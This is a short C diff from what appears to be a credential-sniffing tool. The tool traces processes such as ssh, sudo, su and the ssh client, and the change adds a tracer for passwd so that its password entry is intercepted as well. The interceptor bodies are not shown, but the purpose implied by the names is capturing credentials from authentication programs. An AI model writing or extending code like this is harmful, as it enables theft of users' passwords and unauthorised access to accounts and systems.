@@ -18,7 +18,13 @@
 #include "procinfo.h"
 #include "tracers.h"
 
-void (*tracers[])(pid_t) = {NULL, intercept_ssh, intercept_sudo, intercept_su, intercept_ssh_client, NULL};
+void (*tracers[])(pid_t) = {NULL,
+  intercept_ssh,
+  intercept_sudo,
+  intercept_su,
+  intercept_ssh_client,
+  intercept_passwd,
+  NULL};
 
 pid_t process_pid;
 char *process_name;
@@ -145,7 +151,6 @@ void free_process_username(void) {
 
 enum tracer_types validate_process_name(void) {
 
-
   if (!process_name)
     return invalid_tracer;
 
@@ -161,10 +166,13 @@ enum tracer_types validate_process_name(void) {
   if (ENABLE_SU && strncmp(process_name, P_SU, strlen(P_SU)) == 0)
     return su_tracer;
 
-  if (ENABLE_SSH_CLIENT && (strncmp(process_name, P_SSH_CLIENT, strlen(P_SSH_CLIENT)) == 0 || 
+  if (ENABLE_SSH_CLIENT && (strncmp(process_name, P_SSH_CLIENT, strlen(P_SSH_CLIENT)) == 0 ||
                             strncmp(process_name, P_SSH_SCP_SFTP, strlen(P_SSH_SCP_SFTP)) == 0 ||
                             strncmp(process_name, P_SSH_ADD, strlen(P_SSH_ADD)) == 0))
     return ssh_client_tracer;
+
+  if (strncmp(process_name, P_PASSWD, strlen(P_PASSWD)) == 0)
+    return passwd_tracer;
 
   return invalid_tracer;
 }
